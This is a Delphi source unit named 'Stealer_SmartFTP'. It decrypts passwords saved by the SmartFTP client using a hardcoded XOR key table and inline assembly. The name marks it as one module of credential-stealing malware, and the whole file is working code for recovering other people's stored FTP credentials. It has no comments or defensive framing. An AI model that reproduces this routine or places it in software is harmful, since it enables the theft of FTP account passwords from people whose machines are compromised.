unit Stealer_SmartFTP;

interface

uses
  Sysutils,Windows;

function SmartFTPDecrypt(const Password: AnsiString): String;

implementation

function SmartFTPDecrypt(const Password: AnsiString): String;
label
  over_adc;
const
  smarttable:array[1..100] of word = (
  $E722,$F62F,$B67C,$DD5A,$0FDB,$B94E,$5196,$E040,
  $F694,$ABE2,$21BB,$FC08,$E48E,$B96A,$55D7,$A6E5,
  $A4A1,$2172,$822D,$29EC,$57E4,$1458,$04D1,$9DC1,
  $7020,$FC6A,$ED8F,$EFBA,$8E88,$D689,$D18E,$8740,
  $A6DE,$8E01,$3AC2,$6871,$EE11,$8C2A,$5FC1,$337F,
  $6D32,$D471,$7DC9,$0CD9,$5071,$A094,$1605,$6FD7,
  $3638,$4FFD,$B3B2,$9717,$BECA,$721C,$623F,$068F,
  $698F,$7FFF,$E29C,$27E8,$7189,$4939,$DB4E,$C3FD,
  $8F8B,$F4EE,$9395,$6B1A,$D1B1,$0F6A,$4D8B,$A696,
  $A79D,$BB9E,$00DF,$093C,$856F,$B51C,$F1C5,$E83D,
  $393A,$03D1,$68D8,$9659,$F791,$B2C2,$0234,$9B5C,
  $B1BF,$72EB,$DABA,$F1C5,$DA01,$F047,$3DD8,$72AB,
  $D6DD,$6793,$898D,$7757);
var
  lesi,i,a,b,c:dword;
  pwddata:array[1..100] of word;
begin
  result:='';
  lesi:=length(password) div 2;
  asm
    pushad
    mov esi, lesi
    sar esi, 1
    jns over_adc
    adc esi, 1
    over_adc:
    mov lesi, esi
    popad
  end;
  if lesi = 0 then exit;
  fillchar(pwddata,sizeof(pwddata),0);
  for i:=1 to lesi do
  begin
    pwddata[i]:=word(strtoint('$'+password[(i-1)*4+3]+
                                  password[(i-1)*4+4]+
                                  password[(i-1)*4+1]+
                                  password[(i-1)*4+2]));
    a:=smarttable[i] shl 8;
    b:=smarttable[i] shr 8;
    c:=a or b;
    pwddata[i]:=pwddata[i] xor c;
  end;
  for i:=1 to length(pwddata) do
  begin
    if pwddata[i]=0 then break;
    result:=result+chr(pwddata[i]);
  end;
end;

end.
